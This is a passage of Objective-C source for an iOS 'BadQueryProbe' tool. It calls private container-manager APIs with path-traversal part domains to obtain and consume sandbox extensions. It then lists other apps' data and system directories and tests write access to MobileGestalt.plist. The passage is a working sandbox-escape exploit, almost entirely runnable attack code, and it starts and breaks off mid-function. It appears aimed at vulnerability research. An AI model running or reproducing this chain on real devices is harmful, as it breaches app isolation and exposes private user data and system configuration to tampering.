              @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
            @{@"Name": @"AppGroup root",
              @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
            @{@"Name": @"SystemGroup root (iOS 26 path)",
              @"Path": @"/var/mobile/Containers/Shared/SystemGroup"},
            @{@"Name": @"SystemGroup root (iOS 27 path)",
              @"Path": @"/var/containers/Shared/SystemGroup"},
            @{@"Name": @"System Data root (iOS 27 path)",
              @"Path": @"/var/containers/Data/System"},
            @{@"Name": @"SpringBoard Preferences (file)",
              @"Path": @"/var/mobile/Library/Preferences/com.apple.springboard.plist"},
        ];

        NSMutableArray *results = [NSMutableArray array];
        for (NSDictionary *target in targets) {
            NSMutableDictionary *result = runSingleProbe(target[@"Name"], target[@"Path"], NO);
            [results addObject:result];
            if ([result[@"Status"] isEqualToString:@"denied"]) {
                // One class-13 denial is representative; still try the rest.
                continue;
            }
        }

        // App Group sacrifice route (iOS 26): only when a caller-owned group
        // is configured in Documents/AppGroupSacrifice.plist.
        if (sacrificeGroupId().length) {
            logLine(@"AppGroup sacrifice configured, probing class 7 route");
            for (NSDictionary *target in @[
                @{@"Name": @"AppGroup root (class 7 sacrifice)",
                  @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
                @{@"Name": @"App Data root (class 7 sacrifice)",
                  @"Path": @"/var/mobile/Containers/Data/Application"},
            ]) {
                [results addObject:runSingleProbe(target[@"Name"], target[@"Path"], YES)];
            }
        } else {
            logLine(@"No AppGroupSacrifice.plist (GroupId) configured; class 7 sacrifice route skipped");
        }

        // Enumeration probe on the App Data root once escaped.
        NSDictionary *appRootResult = results.firstObject;
        if ([appRootResult[@"Status"] isEqualToString:@"escaped"] &&
            [appRootResult[@"IsDirectory"] boolValue]) {
            logLine(@"==== fsgetpath enumeration of App Data root ====");
            // bad_query_list strips "/private/var/" internally, so the probe
            // path must use the un-prefixed /var form or every entry is skipped.
            char *list = bad_query_list("/var/mobile/Containers/Data/Application", 5000000);
            if (list) {
                NSString *text = [NSString stringWithUTF8String:list];
                NSArray *lines = [text componentsSeparatedByString:@"\n"];
                logStep(YES, @"bad_query_list", [NSString stringWithFormat:@"%lu entries", (unsigned long)lines.count]);
                logLine([NSString stringWithFormat:@"first entries:\n%@",
                    [[lines subarrayWithRange:NSMakeRange(0, MIN((NSUInteger)10, lines.count))]
                        componentsJoinedByString:@"\n"]]);
                free(list);
            } else {
                logStep(NO, @"bad_query_list", @"returned NULL");
            }
        }

        // Variant matrix: sweep group x flags x part x traversal to locate
        // any token-issuance combination that still survives on this build.
        NSArray<NSDictionary *> *matrix = runVariantMatrix(@"/var/mobile/Containers/Data/Application");

        // Confirmed escapes with STRICT verification: every flag is tried for
        // every target (no early break) and "escaped" requires readdir to
        // list children or read() to return bytes.
        NSMutableArray *confirmed = [NSMutableArray array];
        NSArray<NSDictionary *> *confirmedTargets = @[
            @{@"Name": @"App Data root",
              @"Path": @"/var/mobile/Containers/Data/Application"},
            @{@"Name": @"AppGroup root",
              @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
            @{@"Name": @"InternalDaemon root",
              @"Path": @"/var/mobile/Containers/Data/InternalDaemon"},
            @{@"Name": @"PluginKitPlugin root",
              @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
            @{@"Name": @"MobileGestalt.plist",
              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"},
            @{@"Name": @"SystemGroup root",
              @"Path": @"/var/containers/Shared/SystemGroup"},
            @{@"Name": @"System Data root",
              @"Path": @"/var/containers/Data/System"},
        ];
        for (NSDictionary *target in confirmedTargets) {
            for (NSNumber *flag in @[@(0x900000000ULL), @(0x800000000ULL), @(0x8100000000ULL)]) {
                [confirmed addObject:runConfirmedEscape(target[@"Name"],
                    target[@"Path"], flag.unsignedLongLongValue, 0, YES)];
            }
        }

        // Handle semantics: distinct paths must yield distinct handles.
        NSDictionary *handleProbe = runHandleProbe();

        // Write capability: container write test, activate-flag variants,
        // MobileGestalt owner/mode inspection, extension scope.
        NSDictionary *writeProbe = runWriteProbe();

        // MobileGestalt write verification (only meaningful if read-ok).
        NSMutableDictionary *gestaltWrite = [NSMutableDictionary dictionary];
        NSString *gestaltError = nil;
        NSString *gestaltPath = [[MCMManager sharedManager] mobileGestaltPath:&gestaltError];
        gestaltWrite[@"Path"] = gestaltPath ?: (gestaltError ?: @"unreachable");
        if (gestaltPath) {
            errno = 0;
            BOOL writable = access(gestaltPath.UTF8String, W_OK) == 0;
            gestaltWrite[@"Writable"] = @(writable);
            gestaltWrite[@"WErrno"] = @(writable ? 0 : errno);
            logStep(writable, @"gestalt W_OK", writable ? @"writable" : [NSString stringWithFormat:@"errno=%d", errno]);
            errno = 0;
            int wfd = open(gestaltPath.UTF8String, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
            gestaltWrite[@"OpenRW"] = @(wfd >= 0);
            if (wfd < 0) gestaltWrite[@"OpenRWErrno"] = @(errno);
            if (wfd >= 0) close(wfd);
            logStep(wfd >= 0, @"gestalt open O_RDWR", wfd >= 0 ? @"opened" : [NSString stringWithFormat:@"errno=%d", errno]);

            NSData *original = [NSData dataWithContentsOfFile:gestaltPath];
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPath];
            if (original && [plist isKindOfClass:NSDictionary.class]) {
                NSMutableDictionary *modified = [plist mutableCopy];
                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
                BOOL wrote = [modified writeToFile:gestaltPath atomically:YES];
                gestaltWrite[@"WriteBack"] = @(wrote);
                logStep(wrote, @"gestalt write-back", wrote ? @"marker written" : @"write failed");
                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPath];
                BOOL markerPresent = [readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class];
                gestaltWrite[@"MarkerReadBack"] = @(markerPresent);
                logStep(markerPresent, @"gestalt marker read-back", markerPresent ? @"confirmed" : @"missing");
                BOOL restored = original ? [original writeToFile:gestaltPath atomically:YES] : NO;
                gestaltWrite[@"Restored"] = @(restored);
                logStep(restored, @"gestalt restore", restored ? @"original bytes restored" : @"restore failed");
                NSData *after = [NSData dataWithContentsOfFile:gestaltPath];
                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(original)];
                gestaltWrite[@"SHA256Match"] = @(shaOk);
                logStep(shaOk, @"gestalt SHA-256 verify", shaOk ? @"original intact" : @"MISMATCH");
                gestaltWrite[@"OriginalSHA256"] = sha256Hex(original);
            } else {
                gestaltWrite[@"ParseError"] = @"plist unreadable";
            }
        }
        logStep(gestaltPath != nil, @"gestalt write verification",
            gestaltPath ? @"complete" : @"path unreachable");

        NSDictionary *report = @{
            @"Version": @6,
            @"CreatedAt": NSDate.date,
            @"Environment": environmentInfo(),
            @"Probes": results,
            @"VariantMatrix": matrix,
            @"ConfirmedEscapes": confirmed,
            @"HandleProbe": handleProbe,
            @"WriteProbe": writeProbe,
            @"GestaltWriteVerify": gestaltWrite,
            @"SacrificeGroupConfigured": @(sacrificeGroupId().length > 0),
        };
        NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
        [report writeToFile:resultsPath atomically:YES];
        logStep(YES, @"write results", resultsPath);

        NSString *textPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Report.txt"];
        NSString *textReport = buildTextReport(report);
        [textReport writeToFile:textPath atomically:YES
            encoding:NSUTF8StringEncoding error:nil];
        logStep(YES, @"write text report", textPath);
        logLine(@"==== BadQueryProbe done ====");
}

void BadQueryProbeRun(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        BadQueryProbeRunInternal();
    });
}

void BadQueryProbeRunAgain(void)
{
    BadQueryProbeRunInternal();
}

NSDictionary *BadQueryProbeLastReport(void)
{
    NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
    NSDictionary *report = [NSDictionary dictionaryWithContentsOfFile:resultsPath];
    return [report isKindOfClass:NSDictionary.class] ? report : nil;
}

NSString *BadQueryProbeLogText(void)
{
    NSString *logPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Log.txt"];
    NSString *text = [NSString stringWithContentsOfFile:logPath encoding:NSUTF8StringEncoding error:nil];
    return text ?: @"";
}

static NSString *BadQueryCodeText(int64_t code)
{
    switch (code) {
        case -255: return @"not an absolute path";
        case -254: return @"file does not exist";
        case -5:   return @"asprintf failed";
        case -4:   return @"kernel refused to issue sandbox extension";
        case -3:   return @"outside of containermanager's sandbox";
        case -2:   return @"failed to create sandbox query";
        case -1:   return @"failed to resolve one or more functions";
        default:   return @"unknown error";
    }
}

// Consume a sandbox extension using an explicit class-13 combo (group, flags,
// part, traversal). This is the matrix-verified path used when the canonical
// bad_query flags are blocked at token issuance on iOS 26.6.
static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
                                    uint64_t flags, uint64_t part, BOOL traversal)
{
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_group_identifiers)(void *, xpc_object_t) =
        dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_flags)(void *, uint64_t) =
        dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) =
        dlsym(mgr, "container_query_operation_set_part");
    void (*query_set_part_domain)(void *, const char *) =
        dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*query_get_single_result)(void *) =
        dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
    int64_t (*consume_extension)(const char *) =
        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        dlclose(mgr);
        return -1;
    }
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }
    query_set_class(query, 13);
    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, part);
    if (traversal) {
        NSString *traversalPath =
            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
        query_set_part_domain(query, traversalPath.UTF8String);
    }
    query_set_flags(query, flags);
    void *queryResult = query_get_single_result(query);
    if (!queryResult) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(queryResult);
    if (!token) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        return -4;
    }
    int64_t handle = consume_extension(token);
    free(token);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    query_free(query);
    dlclose(mgr);
    return handle;
}

// Class-parameterized consume: class 13 (system group, group identifiers)
// and class 12 (system data, plain identifiers) with the geod pivot route.
static int64_t BadQueryConsumeComboClass(uint64_t containerClass,
                                         NSString *identifier, BOOL groupIdentifiers,
                                         NSString *targetPath, uint64_t flags,
                                         uint64_t part, BOOL traversal)
{
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_identifiers");
    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
    int64_t (*consume_extension)(const char *) =
        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_identifiers ||
        !query_set_group_identifiers || !query_set_flags || !query_set_part ||
        !query_set_part_domain || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }
    query_set_class(query, containerClass);
    xpc_object_t xid = xpc_string_create(identifier.UTF8String);
    if (groupIdentifiers) query_set_group_identifiers(query, xid);
    else query_set_identifiers(query, xid);
    query_set_part(query, part);
    if (traversal) {
        NSString *traversalPath =
            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
        query_set_part_domain(query, traversalPath.UTF8String);
    }
    query_set_flags(query, flags);
    void *queryResult = query_get_single_result(query);
    if (!queryResult) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(xid);
#endif
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(queryResult);
    if (!token) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(xid);
#endif
        query_free(query);
        dlclose(mgr);
        return -4;
    }
    int64_t handle = consume_extension(token);
    free(token);
#if !OS_OBJECT_USE_OBJC
    xpc_release(xid);
#endif
    query_free(query);
    dlclose(mgr);
    return handle;
}

// ---- strict confirmed escape ----------------------------------------------
// Full chain (consume -> verify) on an explicit matrix combo, with STRICT
// verification: a directory only counts as escaped when readdir actually
// lists children, a file only when read() returns bytes. lstat/access alone
// is NOT proof — the iOS 26.6 sandbox profile allows stat on these paths
// without any extension.
static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
                                               uint64_t flags, uint64_t part,
                                               BOOL traversal)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"Name"] = name;
    result[@"Path"] = path;
    result[@"Flags"] = [NSString stringWithFormat:@"0x%llx", flags];
    result[@"Part"] = @(part);
    result[@"Traversal"] = @(traversal);

    logLine([NSString stringWithFormat:@"==== confirmed escape: %@ (%@) flags=0x%llx part=%llu traversal=%d",
        name, path, flags, part, traversal]);

    int64_t handle = BadQueryConsumeCombo(path,
        @"systemgroup.com.apple.mobilegestaltcache", flags, part, traversal);
    if (handle < 0) {
        result[@"Status"] = @"consume-failed";
        result[@"Code"] = @(handle);
        logStep(NO, @"confirmed consume", [NSString stringWithFormat:@"code=%lld", handle]);
        return result;
    }
    result[@"Handle"] = @(handle);
    logStep(YES, @"confirmed consume", [NSString stringWithFormat:@"handle=%lld", handle]);

    struct stat st = {0};
    errno = 0;
    BOOL statOk = lstat(path.fileSystemRepresentation, &st) == 0;
    result[@"StatOk"] = @(statOk);
    result[@"StatErrno"] = @(statOk ? 0 : errno);
    if (!statOk) {
        result[@"Status"] = @"stat-failed";
        result[@"Errno"] = @(errno);
        logStep(NO, @"confirmed lstat", [NSString stringWithFormat:@"errno=%d", errno]);
        return result;
    }

    NSString *verification = @"unverified";
    NSUInteger childCount = 0;
    if (S_ISDIR(st.st_mode)) {
        errno = 0;
        DIR *dir = opendir(path.UTF8String);
        if (!dir) {
            result[@"OpendirErrno"] = @(errno);
            verification = [NSString stringWithFormat:@"opendir-fail-%d", errno];
            logStep(NO, @"confirmed opendir", [NSString stringWithFormat:@"errno=%d", errno]);
        } else {
            struct dirent *de;
            while ((de = readdir(dir)) != NULL) {
                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
                childCount++;
            }
            closedir(dir);
            result[@"ChildCount"] = @(childCount);
            verification = childCount > 0 ? @"readdir-ok" : @"empty";
            logStep(childCount > 0, @"confirmed readdir",
                [NSString stringWithFormat:@"%lu entries", (unsigned long)childCount]);
        }
    } else if (S_ISREG(st.st_mode)) {
        errno = 0;
        int rfd = open(path.UTF8String, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
        if (rfd < 0) {
            result[@"ReadOpenErrno"] = @(errno);
            verification = [NSString stringWithFormat:@"open-fail-%d", errno];
            logStep(NO, @"confirmed open O_RDONLY", [NSString stringWithFormat:@"errno=%d", errno]);
        } else {
            uint8_t buf[4096];
            errno = 0;
            ssize_t n = read(rfd, buf, sizeof(buf));
            if (n < 0) {
                result[@"ReadErrno"] = @(errno);
                verification = [NSString stringWithFormat:@"read-fail-%d", errno];
                logStep(NO, @"confirmed read", [NSString stringWithFormat:@"errno=%d", errno]);
            } else {
                result[@"BytesRead"] = @(n);
                verification = n > 0 ? @"read-ok" : @"empty-file";
                logStep(n > 0, @"confirmed read", [NSString stringWithFormat:@"%zd bytes", n]);
            }
            close(rfd);
        }
    } else {
        verification = @"special";
    }
    result[@"Verification"] = verification;

    BOOL escaped = [verification isEqualToString:@"readdir-ok"] ||
                    [verification isEqualToString:@"read-ok"];
    result[@"Status"] = escaped ? @"escaped"
        : ([verification hasPrefix:@"opendir-fail"] ||
           [verification hasPrefix:@"open-fail"] ||
           [verification hasPrefix:@"read-fail"]) ? @"denied"
        : @"token-but-unreadable";
    if (escaped) {
        installEscapedLink([name stringByAppendingString:
            [NSString stringWithFormat:@" [h%lld p%llu]", handle, part]], path);
        logStep(YES, @"confirmed escape",
            [NSString stringWithFormat:@"%@ verification=%@", name, verification]);
    } else {
        logStep(NO, @"confirmed escape",
            [NSString stringWithFormat:@"%@ verification=%@", name, verification]);
    }
    return result;
}

// ---- handle semantics probe ------------------------------------------------
// sandbox_extension_consume on two different paths must return two different
// handles; consuming the same path twice should return the same handle
// (deduplication). A constant handle across different paths means consume is
// not really activating anything.
static NSMutableDictionary *runHandleProbe(void)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    logLine(@"==== handle probe: does consume return distinct handles? ====");
    NSArray<NSString *> *paths = @[
        @"/var/mobile/Containers/Data/Application",
        @"/var/mobile/Containers/Data/InternalDaemon",
        @"/var/mobile/Containers/Data/Application",
    ];
    NSMutableArray *handles = [NSMutableArray array];
    for (NSString *path in paths) {
        int64_t h = BadQueryConsumeCombo(path,
            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
        [handles addObject:@(h)];
        logStep(h >= 0, @"handle probe consume",
            [NSString stringWithFormat:@"%@ -> %lld", path, h]);
    }
    result[@"Handles"] = handles;
    BOOL distinct = [handles[0] isKindOfClass:NSNumber.class] &&
                    [handles[1] isKindOfClass:NSNumber.class] &&
                    [handles[0] longLongValue] != [handles[1] longLongValue];
    BOOL dedup = [handles[0] isKindOfClass:NSNumber.class] &&
                 [handles[2] isKindOfClass:NSNumber.class] &&
                 [handles[0] longLongValue] == [handles[2] longLongValue];
    result[@"DistinctForDifferentPaths"] = @(distinct);
    result[@"SameHandleForSamePath"] = @(dedup);
    logStep(distinct, @"handle probe distinct",
        distinct ? @"different paths -> different handles"
                 : @"different paths -> SAME handle (consume not activating?)");
    logStep(dedup, @"handle probe dedup",
        dedup ? @"same path -> same handle (deduplicated)"
              : @"same path -> different handle");
    return result;
}

// ---- activate-parameter variant -------------------------------------------
// The canonical MCM path activates extensions with
// container_object_sandbox_extension_activate(object, false). Try both
// flag values and test whether either yields write access inside a real
// container (mkdir + file write + read back).
static NSMutableDictionary *runActivateVariant(NSString *containerPath, BOOL activateFlag)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"ActivateFlag"] = @(activateFlag);
    logLine([NSString stringWithFormat:@"==== activate variant flag=%d target=%@",
        activateFlag, containerPath]);

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlopen";
        return result;
    }
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    void *(*object_copy)(void *) = dlsym(mgr, "container_object_copy");
    void (*object_free)(void *) = dlsym(mgr, "container_object_free");
    BOOL (*object_activate)(void *, BOOL) =
        (BOOL (*)(void *, BOOL))dlsym(mgr, "container_object_sandbox_extension_activate");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
        !object_copy || !object_free || !object_activate) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlsym";
        return result;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"query_create";
        return result;
    }
    query_set_class(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // canonical part: proven for concrete container paths
    NSString *traversalPath =
        [NSString stringWithFormat:@"../../../../../../../..%@", containerPath];
    query_set_part_domain(query, traversalPath.UTF8String);
    query_set_flags(query, 0x900000000ULL);

    void *queryResult = query_get_single_result(query);
    if (!queryResult) {
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"denied";
        result[@"Stage"] = @"get_single_result";
        logStep(NO, @"activate variant query", @"NULL");
        return result;
    }
    void *object = object_copy(queryResult);
    if (!object) {
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"object_copy";
        return result;
    }
    BOOL activated = object_activate(object, activateFlag);
    result[@"Activated"] = @(activated);
    logStep(activated, @"activate",
        [NSString stringWithFormat:@"flag=%d -> %@", activateFlag, activated ? @"YES" : @"NO"]);

    // Write capability test inside the container.
    NSString *testDir = [containerPath stringByAppendingPathComponent:
        [NSString stringWithFormat:@"FFWriteTest-%d-%d", getpid(), (int)activateFlag]];
    errno = 0;
    BOOL mkdirOk = mkdir(testDir.UTF8String, 0700) == 0;
    result[@"Mkdir"] = @(mkdirOk);
    result[@"MkdirErrno"] = @(mkdirOk ? 0 : errno);
    logStep(mkdirOk, @"activate variant mkdir",
        mkdirOk ? @"created" : [NSString stringWithFormat:@"errno=%d", errno]);
    if (mkdirOk) {
        NSString *file = [testDir stringByAppendingPathComponent:@"probe.txt"];
        NSData *payload = [@"FuckFileWriteProbe\n" dataUsingEncoding:NSUTF8StringEncoding];
        BOOL wrote = [payload writeToFile:file atomically:YES];
        result[@"WriteFile"] = @(wrote);
        logStep(wrote, @"activate variant write", wrote ? @"written" : @"failed");
        NSData *back = [NSData dataWithContentsOfFile:file];
        BOOL verified = wrote && [back isEqualToData:payload];
        result[@"ReadBackVerified"] = @(verified);
        logStep(verified, @"activate variant read-back", verified ? @"verified" : @"failed");
        [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
        rmdir(testDir.UTF8String);
    }
    result[@"Status"] = mkdirOk ? @"writable" : @"readonly";

    object_free(object);
    query_free(query);
    dlclose(mgr);
    return result;
}

// ---- write capability probe -----------------------------------------------
// 1) Owner/mode inspection of MobileGestalt.plist (DAC wall check).
// 2) Extension scope: what the container extension actually covers
//    (root readable, parent denied, children readable).
// 3) Real write test inside our own container (canonical + matrix handles).
// 4) container_object_sandbox_extension_activate flag=true vs false.
static NSMutableDictionary *runWriteProbe(void)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    logLine(@"==== write capability probe ====");

    // 1) MobileGestalt.plist owner / mode (DAC wall).
    NSString *gestaltPath = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
    struct stat gs = {0};
    if (lstat(gestaltPath.UTF8String, &gs) == 0) {
        result[@"GestaltMode"] = [NSString stringWithFormat:@"%04o", gs.st_mode & 07777];
        result[@"GestaltUID"] = @(gs.st_uid);
        result[@"GestaltGID"] = @(gs.st_gid);
        result[@"GestaltWritableByUs"] = @((gs.st_mode & 0222) != 0);
        logStep(YES, @"gestalt owner/mode",
            [NSString stringWithFormat:@"mode=%04o uid=%u gid=%u (any-write-bit=%d)",
                gs.st_mode & 07777, gs.st_uid, gs.st_gid, (gs.st_mode & 0222) != 0]);
    } else {
        result[@"GestaltLstatErrno"] = @(errno);
    }

    // 2) Our own container: extension scope + write test.
    NSString *error = nil;
    NSString *ownContainer = [[MCMManager sharedManager]
        dataContainerPathForIdentifier:@"com.apple.mobile.MobileHouseArrest" error:&error];
    result[@"OwnContainer"] = ownContainer ?: (error ?: @"unreachable");
    if (ownContainer) {
        NSMutableDictionary *scope = [NSMutableDictionary dictionary];

        // Extension scope: root / parent / child readability.
        int64_t h0 = BadQueryConsumeCombo(ownContainer,
            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
        scope[@"HandlePart0"] = @(h0);
        char *pc = strdup(ownContainer.UTF8String);
        int64_t hc = pc ? bad_query(pc, false, NULL, false) : -255;
        free(pc);
        scope[@"HandleCanonical"] = @(hc);
        logStep(h0 >= 0 || hc >= 0, @"own container consume",
            [NSString stringWithFormat:@"part0=%lld canonical=%lld", h0, hc]);

        if (h0 >= 0 || hc >= 0) {
            errno = 0;
            DIR *d = opendir(ownContainer.UTF8String);
            scope[@"RootOpendir"] = @(d != NULL);
            scope[@"RootOpendirErrno"] = @(d ? 0 : errno);
            logStep(d != NULL, @"scope: container root opendir",
                d ? @"ok" : [NSString stringWithFormat:@"errno=%d", errno]);
            if (d) closedir(d);

            NSString *parent = ownContainer.stringByDeletingLastPathComponent;
            errno = 0;
            DIR *dp = opendir(parent.UTF8String);
            scope[@"ParentOpendir"] = @(dp != NULL);
            scope[@"ParentOpendirErrno"] = @(dp ? 0 : errno);
            logStep(dp != NULL, @"scope: parent opendir",
                dp ? @"ok (scope overflows!)" : [NSString stringWithFormat:@"denied errno=%d (expected)", errno]);
            if (dp) closedir(dp);

            NSString *docs = [ownContainer stringByAppendingPathComponent:@"Documents"];
            errno = 0;
            DIR *dd = opendir(docs.UTF8String);
            scope[@"DocumentsOpendir"] = @(dd != NULL);
            scope[@"DocumentsOpendirErrno"] = @(dd ? 0 : errno);
            logStep(dd != NULL, @"scope: Documents opendir",
                dd ? @"ok" : [NSString stringWithFormat:@"errno=%d", errno]);
            if (dd) closedir(dd);

            // Write test in Documents.
            NSString *testDir = [docs stringByAppendingPathComponent:
                [NSString stringWithFormat:@"FFWriteTest-%d", getpid()]];
            errno = 0;
            BOOL mkdirOk = mkdir(testDir.UTF8String, 0700) == 0;
            scope[@"Mkdir"] = @(mkdirOk);
            scope[@"MkdirErrno"] = @(mkdirOk ? 0 : errno);
            logStep(mkdirOk, @"write: mkdir in Documents",
                mkdirOk ? @"created" : [NSString stringWithFormat:@"errno=%d", errno]);
            if (mkdirOk) {
                NSString *file = [testDir stringByAppendingPathComponent:@"probe.txt"];
                NSData *payload = [@"FuckFileWriteProbe\n" dataUsingEncoding:NSUTF8StringEncoding];
                BOOL wrote = [payload writeToFile:file atomically:YES];
                scope[@"WriteFile"] = @(wrote);
                logStep(wrote, @"write: file", wrote ? @"written" : @"failed");
                NSData *back = [NSData dataWithContentsOfFile:file];
                BOOL verified = wrote && [back isEqualToData:payload];
                scope[@"ReadBackVerified"] = @(verified);
                logStep(verified, @"write: read-back", verified ? @"verified" : @"failed");
                [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
                rmdir(testDir.UTF8String);
            }
        }
        result[@"Scope"] = scope;
    }

    // 3) Activate-parameter variants (flag true vs false).
    if (ownContainer) {
        result[@"ActivateFalse"] = runActivateVariant(ownContainer, NO);
        result[@"ActivateTrue"] = runActivateVariant(ownContainer, YES);
    }

    // 4) Writable-extension sweep for MobileGestalt.plist: the plist lives
    // in the mobilegestaltcache group's Library/Caches subtree (part 3),
    // owned by mobile (uid 501) with write bits — DAC is NOT the wall. The
    // wall is that matrix extensions covering it are read-only. Sweep the
    // token-ok combos (esp. part=3 without traversal) with a full write test.
    NSString *gestaltPlist = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
    NSArray<NSDictionary *> *sweep = @[
        @{@"Flags": @(0x900000000ULL), @"Part": @3, @"Traversal": @NO},
        @{@"Flags": @(0x900000000ULL), @"Part": @0, @"Traversal": @NO},
        @{@"Flags": @(0x800000000ULL), @"Part": @3, @"Traversal": @NO},
        @{@"Flags": @(0x800000000ULL), @"Part": @0, @"Traversal": @NO},
        @{@"Flags": @(0x900000000ULL), @"Part": @0, @"Traversal": @YES},
        @{@"Flags": @(0x800000000ULL), @"Part": @0, @"Traversal": @YES},
    ];
    NSMutableArray *sweepResults = [NSMutableArray array];
    NSData *originalPlist = [NSData dataWithContentsOfFile:gestaltPlist];
    for (NSDictionary *combo in sweep) {
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
